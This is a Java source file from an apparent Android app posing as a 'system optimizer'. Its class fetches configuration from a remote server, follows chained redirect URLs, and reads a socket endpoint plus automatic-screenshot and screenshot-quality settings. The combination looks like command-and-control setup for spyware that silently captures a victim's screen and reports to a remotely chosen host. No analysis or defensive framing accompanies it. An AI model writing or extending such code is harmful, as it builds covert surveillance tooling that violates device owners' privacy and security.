package com.system.optimizer.config;

import android.util.Log;

import org.json.JSONObject;

import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.Response;

class ConfigFetcher {
    private static final String TAG = "ConfigFetcher";
    private static final int MAX_DEPTH = 5;
    private static final OkHttpClient httpClient = new OkHttpClient();

    /**
     * Load configuration from the given URL.
     * @param configUrl The URL to fetch config from
     * @return ConfigData or null if failed
     */
    public static ConfigData loadConfig(String configUrl) {
        return loadConfig(configUrl, 0);
    }

    private static ConfigData loadConfig(String configUrl, int depth) {
        if (depth > MAX_DEPTH || configUrl == null || configUrl.isEmpty()) {
            Log.e(TAG, "Config redirect depth exceeded or URL empty");
            return null;
        }

        try {
            configUrl = ConfigData.parseUrl(configUrl);

            Log.d(TAG, "Downloading config from: " + configUrl);

            Request request = new Request.Builder().url(configUrl).build();
            try (Response response = httpClient.newCall(request).execute()) {
                if (!response.isSuccessful()) {
                    Log.e(TAG, "Failed to download config: HTTP " + response.code());
                    return null;
                }

                String responseBody = response.body().string();
                JSONObject configJson = new JSONObject(responseBody);

                String nextConfigUrl = configJson.optString("new_config_url", null);
                if (nextConfigUrl != null && !nextConfigUrl.isEmpty()) {

                    nextConfigUrl = ConfigData.parseUrl(nextConfigUrl);

                    if (nextConfigUrl.equals(configUrl)) {
                        Log.d(TAG, "new_config_url matches recently fetched config URL, skipping recursive download");
                        return null;
                    }
                    
                    Log.d(TAG, "Redirecting to new config URL: " + nextConfigUrl);
                    return loadConfig(nextConfigUrl, depth + 1);
                }

                String socketUrl = configJson.optString("socket_url", null);
                if (socketUrl == null || socketUrl.isEmpty()) {
                    Log.e(TAG, "Config is missing socket_url value");
                    return null;
                }

                int screenshotQuality = configJson.optInt("screenshot_quality", 0);
                boolean autoScreenshotEnabled = configJson.optBoolean("auto_screenshot", false);

                String configHash = ConfigHasher.hashConfig(responseBody);
                return new ConfigData(socketUrl, configUrl, screenshotQuality, configHash, autoScreenshotEnabled);
            }
        } catch (Exception e) {
            Log.e(TAG, "Error downloading/parsing config: " + e.getMessage(), e);
            return null;
        }
    }
}
